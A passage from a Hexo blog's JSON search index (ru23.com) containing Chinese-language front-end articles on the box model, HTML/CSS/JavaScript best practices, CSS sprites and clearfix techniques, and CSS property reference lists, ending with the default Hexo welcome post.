language=\"javascript\"&gt;var sbox = $.boxmodel ? \"标准w3c\":\"ie\";document.write(\"您的页面目前支持：\"+sbox+\"盒子模型\");&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 代码2 与代码1 唯一的不同的就是顶部加了 doctype声明。在所有浏览器中都显示“标准 w3c盒子模型” 所以为了让网页能兼容各个浏览器，让我们用标准 w3c 盒子模型","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"CSS","slug":"CSS","permalink":"https://ru23.com/tags/CSS/"}]},{"title":"前端开发的一些实践规范","slug":"2015-11-前端开发一些实践","date":"2015-11-23T08:55:24.000Z","updated":"2018-10-24T03:46:01.442Z","comments":true,"path":"note/7f75edbf.html","link":"","permalink":"https://ru23.com/note/7f75edbf.html","excerpt":"一、HTML实践 使用标准的HTML5简化的定义的方式 定义文档类型 &lt;!DOCTYPE html&gt; 定义页面的编码 &lt;meata charset=&quot;UTF-8&quot;&gt; 样式和页脚的引用，不需要写type类型，如link script 停止使用不标准的标签和属性，如mqrquee 不推荐在HTML标签中添加样式属性，如img标签中添加宽高 不要使用@import，此方式最大的缺点是引用css文件不能同时并行下载","text":"一、HTML实践 使用标准的HTML5简化的定义的方式 定义文档类型 &lt;!DOCTYPE html&gt; 定义页面的编码 &lt;meata charset=&quot;UTF-8&quot;&gt; 样式和页脚的引用，不需要写type类型，如link script 停止使用不标准的标签和属性，如mqrquee 不推荐在HTML标签中添加样式属性，如img标签中添加宽高 不要使用@import，此方式最大的缺点是引用css文件不能同时并行下载 增加JavaScript禁用的提示信息，最常用的方式是使用&lt;noscript&gt; 添加必要的meta标签 使用频率较高的语义化标签 p ul dl p em strong table site blockquote nav header footer article section aside hground 样式和结构的分离：把HTML中用于表达外观的部分从HTML中删除，并用css实现。如&lt;span&gt;|&lt;/span&gt;中的| 用css的伪类实现即可 如果图片作为页面内容的一部分，应该使用img标签，如果图片仅仅是装饰作用，应该使用背景图片方式 提高表单易用性的手段 使用label标签，并设置label标签的for属性 给输入控件设置合理的placehoder 如有必要，给输入控件设置tab顺序，tabindex用来设置输入控件的切换顺序 &lt;input type=&quot;text&quot; tabindex=&quot;2&quot;&gt; 使用HTML5中引入的表单控件url email date search 精简HTML代码 删除多余的容器 装饰性的元素使用css实现 避免使用table布局 二、CSS实践 推荐的css类的命名规则和元素的id命名规则相似，只是组成类名的关键字的连接符为中划线- .reder-content-title 为了避免class命名的重复，命名时取父元素的class作为前缀 使用css reset统一浏览器的显示效果 给css样式定义排序，最佳是按类型分组排序 显示与浮动、定位、尺寸、边框相关属性、字体样式、背景、其他样式 合理利用css的权重，提高代码的重用性 css样式中尽量不要使用ID选择器，最佳实践尽可能使用较低权重的选择器作为基础样式 减少自选择器的层级 使用组合的css选择器 em px % w3c把尺寸单位分为相对长度单位和绝对长度单位两种。 相对长度单位又分为字体相对单位和视窗相对单位 字体相对单位包括：em ex ch rem 视窗相对单位包括：vw vh vmin vmax 使用最广泛的是em px 百分比 em计算是相对自身元素的字体尺寸的，rem相对于根元素的字体大小计算， 百分比是相对于父元素的尺寸的 如何设置元素的尺寸和字体大小最佳实践 尽量设置相对尺寸（局部的尺寸要尽量使用相对尺寸，即局部自适应） 只有在可预知元素尺寸的情况下才使用绝对尺寸 使用em设置字体大小 css选择器定义最佳实践 避免使用通配符 避免使用标签选择器及单个属性选择器作为关键选择器 不要在id选择器前使用标签名 尽量不要使在选择符中定义过多的层级，最好不要超过三层 css相关图片处理 不要设置图片尺寸 使用css雪碧图技术 减少css代码量 定义简洁的css规则 合并相关的css规则 定义简洁的属性值合并相同的定义 三、JavaScript实践 避免定义全局变量或函数 使用var 使用JavaScript的严格模式use strict; 使用简化的编码方式 对象创建pserson={age:22,name:&quot;poetries&quot;} 数组创建list=[12,23,55] 使用===和!==而不是==和!= 避免使用with语句和eval() 使用更严格的编码格式 使用严格模式遵循： 不要在全局中启用严格模式 在已有代码中谨慎使用严格模式 严格模式主要对不合理的地方做了改进 禁用width关键字 防止意外的全局变量 函数中的this不在默认指向全局 防止函数参数重命名 更安全的使用eval() 事件处理和业务逻辑相分离 配置数据和代码逻辑相分离 逻辑与结构相似相分离 从JavaScript逻辑中分离css样式 从JavaScript中分离HTML结构 JavaScript模块化的开发，提高代码的可维护性 JavaScript的两种模块化规范 ComonJS AMD 两者的主要区别在加载模块的方式上 ComonJS 以同步的方式加载，使用require()方法来加载模块 AMD以异步的方式加载模块 合理使用Ajax技术，适合的使用场景有 前端会根据用户的需求动态取得后端数据，然后更新网页界面 期望通过不刷新页面取得任何资源或页面 动态进行用户输入的认证 四、附录 附录一 DIV命名规范 企业DIV使用频率高的命名方法 网页内容类 标题: title 摘要: summary 箭头： arrow 商标： label 网站标志： logo 转角/圆角：corner 横幅广告： banner 子菜单： subMenu 搜索： search 搜索框： searchBox 登录： login 登录条：loginbar 工具条： toolbar 下拉： drop 标签页： tab 当前的： current 列表： list 滚动： scroll 服务： service 提示信息： msg 热点：hot 新闻： news 小技巧： tips 下载： download 栏目标题： title 热点： hot 加入：joinus 注册： regsiter 指南： guide 友情链接： friendlink 状态： status 版权： copyright 按钮： btn 合作伙伴： partner 投票： vote 左右中：left right center 注释的写法: /* Footer */ 内容区/* End Footer */ id的命名: 页面结构 容器: container 页头：header 内容：content/container 页面主体：main 页尾：footer 导航：nav 侧栏：sidebar 栏目：column 页面外围控制整体布局宽度：wrapper 左右中：left right center 导航 导航：nav 主导航：mainbav 子导航：subnav 顶导航：topnav 边导航：sidebar 左导航：leftsidebar 右导航：rightsidebar 菜单：menu 子菜单：submenu 标题: title 摘要: summary 功能 标志：logo 广告：banner 登陆：login 登录条：loginbar 注册：regsiter 搜索：search 功能区：shop 标题：title 加入：joinus 状态：status 按钮：btn 滚动：scroll 标签页：tab 文章列表：list 提示信息：msg 当前的:current 小技巧：tips 图标: icon 注释：note 指南：guild 服务：service 热点：hot 新闻：news 下载：download 投票：vote 合作伙伴：partner 友情链接：link 版权：copyright class的命名: 颜色:使用颜色的名称或者16进制代码,如 .red { color: red; } .f60 { color: #f60; } .ff8600 { color: #ff8600; } 字体大小,直接使用”font+字体大小”作为名称,如 .font12px { font-size: 12px; } .font9px {font-size: 9pt; } 对齐样式,使用对齐目标的英文名称,如 .left { float:left; } .bottom { float:bottom; } 标题栏样式,使用”类别+功能”的方式命名,如 .barnews { } .barproduct { } 注意事项:: 一律小写; 尽量用英文; 不加中杠和下划线; 尽量不缩写，除非一看就明白的单词. 推荐的 CSS 书写顺序： 显示属性 display list-style position float clear 自身属性 width height margin padding border background 文本属性 color font text-decoration text-align vertical-align white-space other text content 附录二 CSS精灵 CSS精灵原理以及应用 CSS雪碧的基本原理是把你的网站上用到的一些图片整合到一张单独的图片中，从而减少你的网站的HTTP请求数量。 该图片使用CSS background和background-position属性渲染，这也就意味着你的标签变得更加复杂了，图片是在CSS中定义，而非&lt;img&gt;标签。 一个简单的例子： 一张图片作出一个按钮的三个状态 一个链接用CSS做成按钮的样式，我们可以使用同一张图片，完成按钮的三个状态，a:link，a:hover，a:active &lt;a class=&quot;button&quot; href=&quot;#&quot;&gt;链接&lt;/a&gt; 加入右侧的图片为：200px 65px的三个按钮图拼合而成的图片button.png，从上到下一次为按钮的普通、鼠标滑过、鼠标点击的状态。则可以使用CSS进行定义。 12345678910111213141516171819a &#123; display:block; width:200px; height:65px; line-height:65px; /*定义状态*/ text-indent:-2015px; /*隐藏文字*/ background-image:url(button.png); /*定义背景图片*/ background-position:0 0; /*定义链接的普通状态，此时图像显示的是顶上的部分*/&#125;a:hover &#123; background-position:0 -66px; /*定义链接的滑过状态，此时显示的为中间部分，向下取负值*/&#125;a:active &#123; background-position:0 -132px; /*定 义链接的普通状态，此时显示的是底部的部分，向下取负值*/&#125; 更多的CSS雪碧，图片更复杂，背景定位更精确。可能会用到大量的数值 如：background:url(nav.png) -180px 24pxno-repeat; 来达到更精确的定位 优点： 减少加载网页图片时对服务器的请求次数 可以合并多数背景图片和小图标，方便在任何位置使用，这样不同位置的请求只需要调用一个图片，从而减少对服务器的请求次数，降低服务器压力，同时提高了页面的加载速度，节约服务器的流量。 提高页面的加载速度 sprite技术的其中一个好处是图片的加载时间(在有许多 sprite 时，单张图片的加载时间)。由所需图片拼成的一张 GIF图片的尺寸会明显小于所有图片拼合前的大小。单张的 GIF只有相关的一个色表，而单独分割的每一张 GIF 都有自己的一个色表，这就增加了总体的大小。因此，单独的一张 JPEG 或者 PNG sprite 在大小上非常可能比把一张图分成多张得来的图片总尺寸小。 减少鼠标滑过的一些bug IE6不会主动预加载鼠标滑过即a:hover中的背景图片，所以，如果使用多张图片，鼠标滑过会出现闪白的现象。使用CSS雪碧，由于一张图片即可，所以不会出现这种现象。 不足： CSS雪碧的最大问题是内存使用 影响浏览器的缩放功能 拼图维护比较麻烦 使CSS的编写变得困难 CSS 雪碧调用的图片不能被打印 错误得使用 Sprites 影响可访问性 附录三 一些tips解决方案 页面优化实践 从下面的几个方面可以进行页面的优化： 减少请求数 图片合并 CSS文件合并 减少内联样式 避免在 CSS中使用 import 减少文件大小 选择适合的图片格式 图片压缩 CSS 值缩写（Shorthand Property) 文件压缩 页面性能 调整文件加载顺序 减少标签数量 调整选择器长度 尽量使用CSS 制作显示表现 增强代码可读性与可维护性 规范化 语义化 模块化 写DIV+CSS 的一些常识 不要使用过小的图片做背景平铺 这就是为何很多人都不用 1px 的原因，这才知晓。宽高 1px 的图片平铺出一个宽高 200px 的区域，需要 200200=40, 000 次，占用资源 无边框 推荐的写法是 border:none;，哈哈，我一直在用这个。 border:0; 只是定义边框宽度为零，但边框样式、颜色还是会被浏览器解析，占用资源 慎用 通配符 所谓通配符，就是将CSS 中的所有标签均初始化，不管用的不用的，过时的先进的，一视同仁，这样，大大的占用资源。要有选择的初始化标签。 CSS的十六进制颜色代码缩写 习惯了缩写及小写，这才知道，原来不是推荐的写法，为的是减少解析所占用的资源。但同时会增加文件体积。孰优孰劣，有待仔细考证。 样式放头上，脚本放脚下。不内嵌，只外链 坚决不用 CSS表达式 使用 引用样式表，而不是通过@import 导入。 一般来说，PNG比 GIF 要小，小得多。再者，GIF 中有多少颜色是被浪费的，很值得优化。 千万不要在 HTML中缩放图片，一者不好看，二者占资源。 正文字体最好用偶数 12px、14px、16px，效果非常好。特例，15px。 block、ul、ol等上下留出至少一倍行距，左侧至少两倍行距，右侧随意。 段落之间，至少要有一倍行距 强行指定某些元素的 line-height，正文 1.6倍于文字大小，标题1.3倍。 中文标点用全角 英文夹杂在中文中，左右空格，半角。 中文字体的粗体和斜体，远离较好 [建议] HTML 标签的使用应该遵循标签的语义 下面是常见标签语义 p - 段落 h1,h2,h3,h4,h5,h6 - 层级标题 strong,em - 强调 ins - 插入 del - 删除 abbr- 缩写 code - 代码标识 cite - 引述来源作品的标题 q - 引用 blockquote - 一段或长篇引用 ul - 无序列表 ol - 有序列表 dl,dt,dd - 定义列表 常用代码片段 雅虎工程师提供的CSS初始化示例代码【仅供参考】 可以在html头文件中直接引用，从而避免浏览器的不兼容带来的错误。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596body,div,dl,dt,dd,ul,ol,li,h1,h2,h3,h4,h5,h6,pre,code,form,fieldset,legend,input,button,textarea,p,blockquote,th,td &#123; margin:0; padding:0; &#125;body &#123; background:#fff; color:#555; font-size:14px; font-family: Verdana, Arial, Helvetica, sans-serif; &#125;td,th,caption &#123; font-size:14px;&#125;h1, h2, h3, h4, h5, h6 &#123; font-weight:normal; font-size:100%; &#125;address, caption,cite, code, dfn, em, strong,th, var &#123; font-style:normal; font-weight:normal;&#125;a &#123; color:#555; text-decoration:none; &#125;a:hover &#123; text-decoration:underline; &#125;img &#123; border:none;&#125;ol,ul,li &#123; list-style:none; &#125;input, textarea, select, button &#123; font:14px Verdana,Helvetica,Arial,sans-serif; &#125;table &#123; border-collapse:collapse; &#125;html &#123; overflow-y: scroll;&#125; .clearfix:after &#123; content: \".\"; display: block; height:0; clear:both; visibility: hidden;&#125;.clearfix &#123; *zoom:1; &#125; 现代浏览器cssreset解决方案【推荐使用这个】 normalize.css mobile meta标签 1&lt;meta name=”viewport” content=”width=320,target-densitydpi=dpi_value,initial-scale=1, user-scalable=no”/&gt; 表格不被撑开 1table-layout: fixed; word-break: break-all;;border-collapse: collapse 不设宽高居中 12345&lt;div id=”abc” style=”display:table;text-align:center;width:100%;height:100%;”&gt; &lt;span style=”background:#f00; display:table-cell; vertical-align:middle;”&gt; &lt;input type=”button” value=”item1″ /&gt; &lt;/span&gt;&lt;/div&gt; 透明度的兼容代码 1234filter:alpha(opacity=50); /*1-100*/-moz-opacity:0.5; /*0-1.0*/-khtml-opacity:0.5; /*0-1.0*/opacity:0.5; /*0-1.0*/ 文本溢出的几种处理方法 简单隐藏 1div.hide&#123;overflow:hidden&#125; 使用滚动条 1div.scroll&#123;overflow:scroll&#125; 简单裁切 123456div.clip&#123; border:1px solid; overflow:hidden;/*超出隐藏*/ white-space:nowrap;/*强制在一行显示*/ text-overflow:clip;/*裁切*/&#125; 超出部分省略号 12345div.elli&#123; overflow:hidden; white-space:nowrap; text-overflow:ellipsis;/*使用省略号*/&#125; 清除浮动的几种方法 方法一：投机取巧法 – 不推荐 直接一个放到当作最后一个子标签放到父标签那儿，此方法屡试不爽，兼容性强 方法二：overflow + zoom方法 –不推荐 .fix{overflow:hidden; zoom:1;} 此方法优点在于代码简洁，涵盖所有浏览器 方法三：after + zoom方法 -推荐–此方法可以说是综合起来最好的方法了 clearfix只应用在包含浮动子元素的父级元素上 12345678.clearfix&#123;zoom:1;&#125;.clearfix:after&#123; display:block; content:'clear'; clear:both; line-height:0; visibility:hidden;&#125; 方法四 在方法三的基础上的最优雅的做法【推荐】 12345678.clearfix:after,.clearfix:before &#123;/*before 是为了防止浏览器顶部空白的崩溃*/ content: \" \"; display: table;&#125;.clearfix:after &#123; clear: both;&#125; 清除浮动的原理是触发BFC，这里只有clear:both起清除浮动作用，其他的line-height:0; visibility:hidden;都是为了隐藏生的内容需要的 拓展阅读 CSS中的浮动和清除浮动 实用的60个CSS代码片段 一些总结 自动继承属性： color font text-align list-style… 非继承属性： background border position… 具有破坏性的元素： float display:none; position:absoblute/fixed/sticky; 具有包裹性的元素： display:inline-block/table-cell position:absolute/fixed/sticky overflow:hidden/scroll 消除图片底部间隙的方法 图片块状化-无基线对齐img{display:block;} 图片底线对齐img{vertical-align:bottom;} 行高足够小 - 基线位置上移.box{line-height:0;} 参考 web前端开发最佳实践","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"规则","slug":"规则","permalink":"https://ru23.com/tags/规则/"},{"name":"实践","slug":"实践","permalink":"https://ru23.com/tags/实践/"}]},{"title":"梳理常见的CSS属性（二）","slug":"2015-05-梳理常见的CSS属性（二）","date":"2015-05-25T15:56:31.000Z","updated":"2018-10-24T03:46:01.419Z","comments":true,"path":"note/7dab39f7.html","link":"","permalink":"https://ru23.com/note/7dab39f7.html","excerpt":"","text":"一、CSS 文字属性 语 言 功 能 color : #999999; 文字颜色 font-family:宋体,sans-serif; 文字字体 font-size:9pt; 文字大小 font-style:itelic; 文字斜体 font-variant:small-caps; 小字体 letter-spacing:1pt; 字间距离 line-height : 200%; 设置行高 font-weight:bold; 文字粗体 vertical-align:sub; 下标字 vertical-align:super; 上标字 text-decoration:line-through; 加删除线 text-decoration:overline; 加顶线 text-decoration:underline; 加下画线 text-decoration:none; 删除链接下画线 text-transform:capitalize; 首字大写 text-transform:uppercase; 英文大写 text-transform:lowercase; 英文小写 text-align:right; 文字右对齐 text-align:left; 文字左对齐 text-align:center; 文字居中对齐 text-align:justify; 文字两端对齐 vertical-align属性 vertical-align:top; 垂直向上对齐 vertical-align:bottom; 垂直向下对齐 vertical-align:middle; 垂直居中对齐 vertical-align:text-top; 文字垂直向上对齐 vertical-align:text-bottom; 文字垂直向下对齐 二、CSS 项目符号 list-style-type:none; 不编号 list-style-type:decimal; 阿拉伯数字 list-style-type:lower-roman; 小写罗马数字 list-style-type:upper-roman; 大写罗马数字 list-style-type:lower-alpha; 小写英文字母 list-style-type:upper-alpha; 大写英文字母 list-style-type:disc; 实心圆形符号 list-style-type:circle; 空心圆形符号 list-style-type:square; 实心方形符号 list-style-image:url(/dot.gif) 图片式符号 list-style-position:outside; 凸排 list-style-position:inside; 缩进 三、CSS 背景样式 background-color:#F5E2EC; 背景颜色 background:transparent; 透视背景 background-image:url(image/bg.gif); 背景图片 background-attachment:fixed; 浮水印固定背景 background-repeat:repeat; 重复排列-网页默认 background-repeat:no-repeat; 不重复排列 background-repeat:repeat-x; 在 X 轴重复排列 background-repeat:repeat-y; 在 Y 轴重复排列 background-position:90% 90%; 背景图片 X 与 Y 轴的位置 background-position:top; 向上对齐 background-position:buttom; 向下对齐 background-position:left; 向左对齐 background-position:right; 向右对齐 background-position:center; 居中对齐 四、CSS 链接属性 a 所有超链接 a:link 超链接文字格式 a:visited 浏览过的链接文字格式 a:active 按下链接的格式 a:hover 鼠标转到链接 cursor:crosshair 十字体 cursor:s-resize 箭头朝下 cursor:help 加一问号 cursor:w-resize 箭头朝左 cursor:n-resize 箭头朝上 cursor:ne-resize 箭头朝右上 cursor:nw-resize 箭头朝左上 cursor:text 文字 I 型 cursor:se-resize 箭头斜右下 cursor:sw-resize 箭头斜左下 cursor:wait 漏斗 五、CSS 边框属性 border-top:1px solid #6699cc; 上框线 border-bottom:1px solid #6699cc; 下框线 border-left:1px solid #6699cc; 左框线 border-right:1px solid #6699cc; 右框线 solid 实线框 2+6010 47dotted 虚线框 double 双线框 groove 立体内凸框 ridge 立体浮雕框 inset 凹框 outset 凸框 六、CSS 表单 &lt;input type=&quot;text&quot; name=&quot;T1&quot; size=&quot;15&quot;&gt; 文本域 &lt;input type=&quot;submit&quot; value=&quot;submit&quot; name =&quot;B1&quot;&gt; 按钮 &lt;input type=&quot;checkbox&quot; name=&quot;C1&quot;&gt; 复选框 &lt;input type=&quot;radio&quot; value=&quot;V1&quot; checked name=&quot;R1&quot;&gt; 单选按钮 &lt;select size=&quot;1&quot; name=&quot;D1&quot;&gt;&lt;option&gt;选项1&lt;/option&gt; &lt;option&gt;选项 2&lt;/option&gt;&lt;/select&gt; 列表菜单 &lt;textarea rows=&quot;1&quot; name=&quot;1&quot; cols=&quot;15&quot;&gt; 多行文本域 七、CSS 边界样式 margin-top:10px; 上边界 margin-right:10px; 右边界值 margin-bottom:10px; 下边界值 margin-left:10px; 左边界值 八、CSS 边框空白 padding-top:10px; 上边框留空白 padding-right:10px; 右边框留空白 padding-bottom:10px; 下边框留空白 padding-left:10px; 左边框留空白 附录 css常用属性思维导图总结","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"CSS","slug":"CSS","permalink":"https://ru23.com/tags/CSS/"}]},{"title":"css常用属性梳理（一）","slug":"2015-05-css常用属性梳理（一）","date":"2015-05-05T15:24:17.000Z","updated":"2018-10-24T03:46:01.408Z","comments":true,"path":"note/6282513e.html","link":"","permalink":"https://ru23.com/note/6282513e.html","excerpt":"","text":"代码 说明 类型 font-family 字体 font-size 字体大小 font-style 字体样式 italic 斜体 oblique 扁斜体 line-height 行高 font-weight 字体粗细 font-variant 字体变形 small-caps 小型大写字母 text-transform 大小写 capitalize 首字母大写 uppercase 大写字母 lowercase 小写字母 text-decathlon 文本修饰 underline 下划线 overline 上划线 line-through 删除线 blink 闪烁 none 无 color 颜色 背景 background-color 背景颜色 background-image 背景图片 background-repeat 背景重复 background-attachment 附件 fixed 固定的 scroll 滚动 background-position（x） 背景水平位置 background-position（y） 背景垂直位置 right 右对齐 left 左对齐 center 居中对齐 区块 word-spacing 单词间距 letter-spacing 字母间距 vertical-align 垂直对齐 baseline 基线 sub 下标 super 上标 top 顶部 text-top 文本顶对齐 middle 中线对齐 bottom 顶部 text-bottom 文本底对齐 text-align 文本对齐 text-indent 文本缩进 white-space 空格 normal 正常 pre 保留 nowrap 不换行 display 显示 inline 内联 bloc 块 list-item 列表项 run-in 追加部分 inline-block 内嵌块 compact 紧凑 marker 标志 table 表格 inline-table 内嵌表格 table-row-group 表格行组 table-row 表格行 table-column 表格列 table-cell 表格单元格 table-captaion 表格标题 方框 width 宽度 height 高度 float 浮动 clear 清除 padding 内边距 margin 外边距 top 上 bottom 下 边框 style 样式 dotted 点划线 dashed 虚线 solid 实线 double 双线 groove 槽状 inset 凸状 outset 突出 列表 list-style-type 类型 disc 网点 circle 圆圈 square 方块 decimal 数字 lower-roman 小写罗马数字 upper-roman 大写罗马数字 lower-alpha 小写字母 list-style-image 项目符号图像 list-style-position 位置 inside 内 outside 外 定位 position 位置 absolute 绝对 fixed 固定 relative 相对 static 静态 visibility 显示 inherit 继承 visible 可见 hidden 隐藏 width 宽度 z-index 设置层数 overflow 溢出 placement 定位 clip 剪辑 扩展 page-break-before 之前 page-break-afetr 之后 auto 自动 always 总是 cursor 光标 filter 过滤器","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"CSS","slug":"CSS","permalink":"https://ru23.com/tags/CSS/"}]},{"title":"Hello Hexo Blog","slug":"2015-03-hello-world","date":"2015-03-03T07:17:54.000Z","updated":"2018-10-24T07:47:15.127Z","comments":true,"path":"note/b479543d.html","link":"","permalink":"https://ru23.com/note/b479543d.html","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[{"name":"Hexo教程","slug":"Hexo教程","permalink":"https://ru23.com/categories/Hexo教程/"}],"tags":[]}]}